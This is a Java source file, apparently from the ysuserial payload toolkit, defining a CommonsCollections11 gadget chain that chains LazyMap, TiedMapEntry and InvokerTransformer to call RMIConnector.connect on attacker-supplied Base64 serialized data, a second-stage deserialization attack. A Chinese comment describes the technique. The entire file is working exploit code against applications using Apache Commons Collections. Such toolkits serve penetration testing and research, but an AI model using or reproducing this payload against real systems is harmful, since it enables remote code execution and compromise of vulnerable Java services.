package org.su18.ysuserial.payloads;

import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.su18.ysuserial.payloads.util.Reflections;

import javax.management.remote.JMXServiceURL;
import javax.management.remote.rmi.RMIConnector;
import java.util.HashMap;
import java.util.Map;

/**
 * RMIConnector 二次反序列化
 * 需要调用其 connect 方法，因此需要调用任意方法的 Gadget，这里选择了 InvokerTransformer
 * 直接传入 Base64 编码的序列化数据即可
 *
 * @author su18
 */
public class CommonsCollections11 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {

		JMXServiceURL jmxServiceURL = new JMXServiceURL("service:jmx:rmi://");
		Reflections.setFieldValue(jmxServiceURL, "urlPath", "/stub/" + command);
		RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null);

		InvokerTransformer invokerTransformer = new InvokerTransformer("connect", null, null);

		HashMap<Object, Object> map          = new HashMap<>();
		Map<Object, Object>     lazyMap      = LazyMap.decorate(map, new ConstantTransformer(1));
		TiedMapEntry            tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector);

		HashMap<Object, Object> expMap = new HashMap<>();
		expMap.put(tiedMapEntry, "su18");
		lazyMap.remove(rmiConnector);

		Reflections.setFieldValue(lazyMap, "factory", invokerTransformer);

		return expMap;
	}
}
